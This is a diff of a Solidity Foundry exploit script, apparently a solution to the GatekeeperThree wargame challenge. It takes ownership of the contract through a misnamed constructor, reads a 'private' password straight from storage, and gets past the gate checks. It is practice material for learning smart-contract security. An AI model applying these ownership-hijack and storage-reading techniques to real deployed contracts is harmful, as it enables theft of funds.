@@ -3,42 +3,46 @@ pragma solidity ^0.8.0;
 import "@forge-std/Script.sol";
 import "../src/GatekeeperThree.sol";
 
-contract Attack is Script {
+contract Attack{
     GatekeeperThree public g3Contract;
 
-    constructor() {
-        g3Contract = GatekeeperThree((payable(vm.envAddress("GATEKEEPERTHREE_CONTRACT"))));
+    constructor(address payable g3) {
+        g3Contract = GatekeeperThree(g3);
     }
 
-    function pwn() public returns(bool ans, address nedded){
-        g3Contract.createTrick();
-        bytes32 pass = vm.load(address(g3Contract.trick()), bytes32(uint256(2)));
-        g3Contract.getAllowance(uint(pass));
+    function pwn() public returns(bool ans){
         ans = g3Contract.enter();
-        nedded = g3Contract.entrant();
     }
 
     function callConstruct0r() public {
       g3Contract.construct0r();
     }
+
+    function getBalance() public returns(uint){
+        return address(g3Contract).balance;
+    }
 }
 
 contract GatekeeperThreeScript is Script {
-    Attack public attack;
+    GatekeeperThree public g3contract;
     function setUp() public {
-      attack = new Attack();
-      vm.allowCheatcodes(address(attack));
+      g3contract = GatekeeperThree(payable(vm.envAddress("GATEKEEPERTHREE_CONTRACT")));
     }
 
     function run() public {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-        address g3Address = address(attack.g3Contract());
+        Attack attack = new Attack(payable(g3contract));
         attack.callConstruct0r();
-        (bool success,) = payable(g3Address).call{value: 0.002 ether}("");
+        assert(g3contract.owner() == address(attack));
+        (bool success,) = payable(g3contract).call{value: 0.002 ether}("");
         require(success, "failed");
-        (bool result, address ned) = attack.pwn();
-        require(result, "failed bool");
-        require(ned == address(vm.envAddress('MY_ADDRESS')), "failed address");
+        require(attack.getBalance() > 0.002 ether, "balance is 0");
+        g3contract.createTrick();
+        bytes32 pass1 = vm.load(address(g3contract.trick()), bytes32(uint256(2)));
+        g3contract.getAllowance(uint(pass1));
+        require(g3contract.allow_enterance() == true, "allowance not set");
+        bool result = attack.pwn();
+        assert(g3contract.entrant() == address(0xe9A9dde47F4ACae71fE040e6E5B16467E1C4F423));//address(vm.envAddress("GATEKEEPERTHREE_CONTRACT")));
         vm.stopBroadcast();
     }
 }
